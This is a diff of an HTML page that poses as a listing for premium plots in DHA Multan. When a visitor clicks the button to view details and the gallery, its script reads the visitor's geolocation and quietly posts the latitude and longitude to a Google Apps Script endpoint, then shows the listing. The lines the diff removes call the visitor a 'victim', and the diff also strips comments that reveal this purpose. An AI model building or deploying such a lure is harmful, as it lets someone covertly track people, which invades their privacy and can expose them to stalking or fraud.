@@ -13,8 +13,8 @@
 
     <style>
         :root {
-            --primary-blue: #0f172a; /* Deep Navy */
-            --accent-gold: #d4af37;  /* Premium Gold */
+            --primary-blue: #0f172a;
+            --accent-gold: #d4af37;
             --bg-light: #f8fafc;
             --text-dark: #334155;
             --white: #ffffff;
@@ -47,7 +47,6 @@
             position: relative;
         }
 
-        /* Header Section */
         .header {
             background: linear-gradient(135deg, var(--primary-blue) 0%, #1e293b 100%);
             padding: 30px 20px;
@@ -93,7 +92,6 @@
             opacity: 0.9;
         }
 
-        /* Image Gallery Section */
         .gallery-container {
             padding: 20px;
             background: var(--white);
@@ -131,7 +129,6 @@
             margin-right: 5px;
         }
 
-        /* The Professional Button */
         .cta-container {
             padding: 0 20px 30px 20px;
             text-align: center;
@@ -165,7 +162,6 @@
             transform: translateY(0);
         }
 
-        /* Loader */
         #loader {
             display: none;
             margin-top: 15px;
@@ -176,16 +172,14 @@
             gap: 10px;
         }
 
-        /* Success & Hidden Content */
         #successMsg {
             display: none;
             padding: 20px;
-            background: #f0fdf4; /* Light Green bg */
+            background: #f0fdf4;
             border-top: 1px solid #dcfce7;
             animation: slideUp 0.5s ease-out;
         }
 
-        /* Specific Text Styling as Requested */
         .success-text {
             text-align: center;
             color: #166534;
@@ -215,7 +209,6 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
-        /* The "Plot Location" Button */
         .plot-location-btn {
             display: block;
             width: 100%;
@@ -247,19 +240,16 @@
 <body>
 
     <div class="card">
-        <!-- Header -->
         <div class="header">
             <span class="badge">Exclusive Listing</span>
             <h1>Premium Pair Kanal Plots</h1>
             <p><i class="fas fa-map-marker-alt"></i> DHA Multan, Sector I</p>
         </div>
 
-        <!-- Main Image -->
         <div class="gallery-container">
-            <!-- Main Plot Image -->
+            <!-- YOUR MAIN IMAGE -->
             <img src="https://i.postimg.cc/nrDsQq77/c5461333b4492579a675f0b54438c9b9.jpg" alt="Plot View" class="main-image">
             
-            <!-- Front Details Grid -->
             <div class="details-grid">
                 <div class="detail-item"><i class="fas fa-ruler-combined"></i> Pair Kanal</div>
                 <div class="detail-item"><i class="fas fa-road"></i> 80 Ft Road</div>
@@ -268,7 +258,6 @@
             </div>
         </div>
 
-        <!-- CTA Button -->
         <div class="cta-container">
             <button id="contactBtn" onclick="sendLocation()">
                 <i class="fas fa-folder-open"></i> View Details and View Gallery
@@ -279,15 +268,11 @@
             </div>
         </div>
 
-        <!-- Success Message & Hidden Content -->
         <div id="successMsg">
-            
-            <!-- STRICT TEXT AS REQUESTED -->
             <p class="success-text">
                 Seller will call you shortly. Here is the plot gallery.
             </p>
 
-            <!-- Hidden Content Revealed After Click -->
             <div class="hidden-content" id="plotDetails">
                 
                 <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Details:</h4>
@@ -303,13 +288,12 @@
                 
                 <h4 style="color: var(--primary-blue); margin-bottom: 10px; font-family: 'Montserrat', sans-serif;">Plot Gallery:</h4>
                 <div class="gallery-small">
-                    <!-- Image 1: Replace with actual plot image -->
-                    <img src="https://i.postimg.cc/FH9qF42n/Whats-App-Image-2026-07-30-at-3-43-41-PM.jpg-1600596542815-2a4d9fdd4070?ixlib=rb-1.2.1&auto=format&fit=crop&w=300&q=80" alt="Plot 1039 View">
-                    <!-- Image 2: Replace with actual plot image -->
-                    <img src="https://i.postimg.cc/sfYwML9R/Whats-App-Image-2026-07-30-at-3-43-41-PM-(1).jpg-1600607687939-ce8a6c25118c?ixlib=rb-1.2.1&auto=format&fit=crop&w=300&q=80" alt="Plot 1040 View">
+                    <!-- YOUR GALLERY IMAGE 1 -->
+                    <img src="https://i.postimg.cc/sfYwML9R/Whats-App-Image-2026-07-30-at-3-43-41-PM-(1).jpg" alt="Plot 1039 View">
+                    <!-- YOUR GALLERY IMAGE 2 -->
+                    <img src="https://i.postimg.cc/FH9qF42n/Whats-App-Image-2026-07-30-at-3-43-41-PM.jpg" alt="Plot 1040 View">
                 </div>
 
-                <!-- PLOT LOCATION BUTTON -->
                 <a href="https://maps.app.goo.gl/GcjtRxyA7A8xsVoVA" target="_blank" id="plotLocationBtn" class="plot-location-btn">
                     <i class="fas fa-map-pin"></i> Plot Location
                 </a>
@@ -318,7 +302,7 @@
     </div>
 
     <script>
-        // REPLACE WITH YOUR GOOGLE SCRIPT URL
+        // ⚠️ REPLACE WITH YOUR GOOGLE SCRIPT URL
         var scriptURL = 'https://script.google.com/macros/s/YOUR_NEW_SCRIPT_ID/exec'; 
 
         function sendLocation() {
@@ -327,18 +311,13 @@
             var success = document.getElementById('successMsg');
             var hiddenContent = document.getElementById('plotDetails');
 
-            // 1. Hide button, show loader
             btn.style.display = 'none';
             loader.style.display = 'flex';
 
-            // 2. Get Location
             navigator.geolocation.getCurrentPosition(function(position) {
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
 
-                console.log("Victim Location Captured - Lat: " + lat + ", Lon: " + lon);
-
-                // 3. Send to Google Sheets (Silently in background)
                 fetch(scriptURL, { 
                     method: 'POST',
                     body: JSON.stringify({lat: lat, lon: lon}),
@@ -348,17 +327,14 @@
                     mode: 'no-cors' 
                 })
                 .then(response => {
-                    // 4. Show Hidden Content (Details + 2 Images + Plot Location Button)
                     loader.style.display = 'none';
                     success.style.display = 'block';
-                    
-                    // Reveal the plot details and gallery
                     hiddenContent.style.display = 'block';
                 })
                 .catch(error => {
                     loader.style.display = 'none';
                     alert("Error sending location. Please try again.");
-                    btn.style.display = 'flex'; // Restore button
+                    btn.style.display = 'flex';
                 });
 
             }, function(error) {
